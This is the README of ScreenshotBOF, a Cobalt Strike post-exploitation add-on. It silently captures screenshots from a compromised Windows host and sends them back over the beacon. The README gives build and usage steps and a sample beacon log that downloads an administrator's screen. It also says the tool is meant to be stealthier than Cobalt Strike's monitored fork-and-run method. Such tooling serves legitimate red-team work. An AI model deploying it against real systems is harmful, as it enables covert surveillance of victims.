# ScreenshotBOF

An alternative screenshot capability for Cobalt Strike that uses WinAPI and does not perform a fork & run. Screenshot downloaded in memory.

# Release 2.0
- JPEG is used in place of BMP
- Moved to mingw
- Added beacon screenshot callback option
- Removed BMP renderer (it will be missed)
- Supports capturing of minimized windows

## Self Compilation
1. git clone the repo
2. run `make`

## Save methods:  
0. drop file to disk
1. download file over beacon (Cobalt Strike only)
2. download file over beacon as a screenshot (Cobalt Strike only)

## PID
0: capture full screen (PID = 0)
specific PID: capture specific PID (works even when minimized!)

## Usage
1. import the screenshotBOF.cna script into Cobalt Strike
2. use the command screenshot_bof {local filename} {save method 0/1/2} {pid/0}
  
```
beacon> screenshot_bof file.jpg 2 21964
[*] Running screenshot BOF by (@codex_tf2)
[+] host called home, sent: 12421 bytes
[+] received output:
Downloading JPEG over beacon as a screenshot with filename file.jpg
[*] received screenshot of Screenshot from Admin (26kb)
[+] received output:
Screenshot saved/downloaded successfully
```


## Notes
- no evasion is performed, which should be fine since the WinAPIs used are not malicious

## Why did I make this?
Cobalt Strike uses a technique known as fork & run for many of its post-ex capabilities, including the screenshot command. While this behaviour provides stability, it is now well known and heavily monitored for. This BOF is meant to provide a more OPSEC safe version of the screenshot capability.

## Credits
- Save BMP to file from https://stackoverflow.com/a/60667564
- in memory download from https://github.com/anthemtotheego/CredBandit
- @BinaryFaultline for (deprecated) BMP rendering in aggressorscript, and screenshot callback function
- bitmap to jpeg from https://github.com/WKL-Sec/HiddenDesktop

## Disclaimer
usual disclaimer here, I am not responsible for any crimes against humanity you may commit or nuclear war you may cause using this piece of poorly written code.
